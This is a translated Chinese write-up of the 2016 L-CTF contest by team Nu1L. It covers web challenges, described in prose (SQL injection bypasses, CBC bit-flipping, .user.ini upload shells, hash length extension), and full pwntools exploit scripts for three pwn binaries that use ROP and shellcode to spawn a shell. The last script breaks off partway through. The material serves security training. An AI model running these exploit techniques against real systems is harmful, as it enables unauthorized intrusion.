# 【CTF攻略】最新2016 L-CTF writeup
|
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
作者：Nu1L ****
稿费：700RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
2016 第一届全国网络安全对抗赛(L-CTF)解题报告
队伍： **Nu1L**
**web**
****
**签到题**
过滤了相关字符，and,select,updatexml双写绕过就好，空格用/**/代替，拿到密码we1c0me%_#2&_@LCTF。进去之后发现任意提交passwd提示密码不对，让num=0，passwd=5487即可。
**我控几不主我及几啦**
虽然说写了waf，但是sqlmap照样能过XD。各种tamper加上就好了：
****
****
**苏达学姐的网站**
题目一共分为三步
第一步是一个正则绕过：
题目的正则应该是^php://.*resource=(.*$这种形式，而且第一步应该先会检测是否是图片，于双次绕过就好了:
再读一下file/admin.php.txt：
熟悉的CBC字节翻转攻击：
****
****
拿到cookie之后，登录进去发现是一个上传页面，测试后发现可以上传ini文件，于是通过上传.user.ini文件，getshell，菜刀连上发现flag：
****
**睡过了**
前几天刚爆出来的漏洞，关于magic函数wakeup在反序列化数据时，如果属性过多导致wakup失效，具体文章可以自己找下。利用+号以及修改属性值绕过，最后利用glob绕过open_basedir，在/var/www/flag目录下发现flag：
**headpic**
感觉学到很多的一个题目：
首先是二次盲注，我们发现随意注册一个用户进入之后会有修改用户头像的地方，而主办方放的提示是二次注入，猜测修改头像时，会把用户名带入查询，如果查询错误，头像返回就是空，如果不是，则头像返回就会有长度，于是利用mid函数就可以了，py小脚本上一发：
得到用户密码：1d5afc15d99fe43fb602b25f3b5d2ee0
Cmd5解密是1admin2016
然后fuzz下目录，发现有admin.php以及robots.txt，用户更换图片地方存在ssrf（但是没什么用?不过能看源码）：
主办方提示了比较函数，而直接admin账户登录是显示账户错误的，于是user[]数组绕过即可，最后拿到flag：
**你一定不能来这**
比较好玩的一个题目，虽然最后看运气，首先fuzz下目录，发现：
然后访问下：
下载下download.php:
Hash长度扩展攻击，利用py下的hashpumpy爆破下secert的长度就可以了：
得到长度是18：
然后下载www.rar，发现有密码QAQ，hex编辑器打开在最后发现jjencode代码，github上有解密的脚本：
YoU CAN gET Some INterESted Thing If You CAN deCOde Me In tImE.
培根密码：XXDDCCTTFF
拿到源码之后，没有什么逻辑，就是爆破time时间戳与rand随机数1-10000结合之后的md5：
于是burp或者自己写多线程脚本跑就好了：
要注意，抓包获得的时间并不是东八区北京时间，所以需要加8才能算对，感谢主办方后期心疼我们改了时间，要不然根本出不来= =
**Pwn**
****
****
**Pwn100**
很明显的栈溢出，然后就是构造ROP，泄露libc地址，调用system(“/bin/sh”)
    from pwn import *
    DEBUG = 0
    if DEBUG:
        context.log_level = 'debug'
        io = process('./pwn100')
        gdb.attach(io)
    else:
        io = remote('119.28.63.211', 2332)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    elf = ELF('./pwn100')
    puts_got_addr = elf.got['puts']
    read_got_addr = elf.got['read']
    puts_plt_addr = elf.symbols['puts']
    read_plt_addr = elf.symbols['read']
    pop_rdi_ret_addr = 0x0000000000400763
    pop_rsi_pop_r15_ret_addr = 0x0000000000400761
    pop_pop_pop_pop_ret_addr = 0x000000000040075d
    rsp = 0x00601300
    payload = 'A' * 0x40 + 'B' * 0x8 + p64(pop_rdi_ret_addr) + p64(puts_got_addr) + p64(puts_plt_addr)
    payload += p64(pop_rdi_ret_addr) + p64(read_got_addr) + p64(puts_plt_addr)
    payload += p64(pop_rdi_ret_addr) + p64(0) + p64(pop_rsi_pop_r15_ret_addr) + p64(rsp) + p64(1) + p64(read_plt_addr)
    payload += p64(pop_pop_pop_pop_ret_addr) + p64(rsp)
    payload = payload.ljust(0xC8, 'A')
    raw_input('go?')
    io.send(payload)
    io.recvline()
    libc_puts_addr = u64(io.recvline()[:6] + 'x00x00')
    libc_read_addr = u64(io.recvline()[:6] + 'x00x00')
    libc_base_addr = libc_puts_addr - 0x00070c70
    libc_system_addr = libc_base_addr + 0x000468f0
    bin_sh_addr = libc_base_addr + 0x0017dbc5
    # libc_system_addr = libc_puts_addr - (libc.symbols['puts'] - libc.symbols['system'])
    # bin_sh_addr = libc_puts_addr - (libc.symbols['puts'] - next(libc.search('/bin/sh')))
    log.info('libc_puts_addr:%s' % hex(libc_puts_addr))
    log.info('libc_read_addr:%s' % hex(libc_read_addr))
    payload2 = p64(1) * 3
    payload2 += p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(libc_system_addr)
    io.sendline(payload2)
    io.interactive()
**Pwn200**
首先IDA静态分析，400A8E函数存在一个栈地址泄漏
继续分析程序流程，在4007DF处发现输入的ID第一位为0时直接结束该函数执行然后去执行400A29，该函数中有strcpy存在很明显的栈溢出。
又因40096D中调用free，所以直接将shellcode起始地址覆盖free_plt，调用free时直接开sh:
    #!/usr/bin/env python
    from pwn import *
    DEBUG = 0
    if DEBUG:
        p = process('./pwn2003sw54ed65rf7t')
    else:
        p = remote('119.28.63.211', 2333)
    #pwntools shellcraft
    shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')
    #some address
    free_plt = 0x0000000000602018
    def pwn():
        p.recvuntil('who are u?n')
        p.send(shellcode.ljust(48))
        p.recvuntil(shellcode.ljust(48))
        leak_addr = u64(p.recvn(6).ljust(8, 'x00'))
        shellcode_addr = leak_addr - 0x50
        print 'shellcode addr: ' + hex(shellcode_addr)
        p.recvuntil('give me your id ~~?n')
        p.sendline('0')
        p.recvuntil('give me money~n')
        payload = p64(shellcode_addr).ljust(56, 'x00') + p64(free_plt)
        p.send(payload)
        p.sendline('2')
        p.interactive()
    if __name__ == '__main__':
        pwn()
**Pwn300**
拿到程序运行发现缺少lib，readelf看一下发现程序需要两个特殊的库:
libio和libgetshell，用ida分析可以很轻松找到栈溢出，利用栈溢出将libgetshell
dump下来看到一个名为getshell的函数，跳到那里就可以拿shell。
脚本：
    #!/usr/bin/env python2
    # -*- coding:utf-8 -*-    from pwn import *
    from ctypes import *
    from hexdump import hexdump
    import os, sys
    # switches
    DEBUG = 0
    LOCAL = 0
    VERBOSE = 1
    # modify this
    if LOCAL:
        io = process('./pwn300kh6y5gt3treg')
    else:
        io = remote('119.28.63.211',2339)
    if VERBOSE: context(log_level='debug')
    # define symbols and offsets here
    # simplified r/s function
    def ru(delim):
        return io.recvuntil(delim)
    def rn(count):
        return io.recvn(count)
    def ra(count):      # recv all
        buf = ''
        while count:
            tmp = io.recvn(count)
            buf += tmp
            count -= len(tmp)
        return buf
    def sl(data):
        return io.sendline(data)
    def sn(data):
        return io.send(data)
    def info(string):
        return log.info(string)
    def dehex(s):
        return s.replace(' ','').decode('hex')
    def limu8(x):
        return c_uint8(x).value
    def limu16(x):
        return c_uint16(x).value
    def limu32(x):
        return c_uint32(x).value
    # define interactive functions here
    def recursive():
        for i in xrange(10):
            ru('fuck me!n')
            payload = 40 * 'a' + p64(0x4004a9)
            sn(payload.ljust(0xa0))
        return
    def leak(addr, length=40):
        ru('fuck me!n')
        pad = 40 * 'A'
        pop6 = 0x40049e
        callframe = 0x400484
        write_got = 0x601018
        payload = pad + p64(pop6) + p64(write_got) + p64(length) + p64(addr) + p64(1) + p64(callframe) + p64(0) * 7 + p64(0x4004A9)
        print len(payload)
        assert len(payload) <= 0xa0
        sn(payload.ljust(0xa0))
        return ra(length)
    # define exploit function here
    def pwn():
        if DEBUG: gdb.attach(io)
        recursive()
        dynelf = DynELF(leak, elf=ELF("./pwn300kh6y5gt3treg"))
        #r = leak(0x601018)
        #hexdump(r)
        libgetshell = dynelf.lookup(None, "libgetshell")
        getshell = dynelf.lookup('getshell', 'libgetshell')
        info("Libgetshell = " + hex(libgetshell))
        info("Getshell = " + hex(getshell))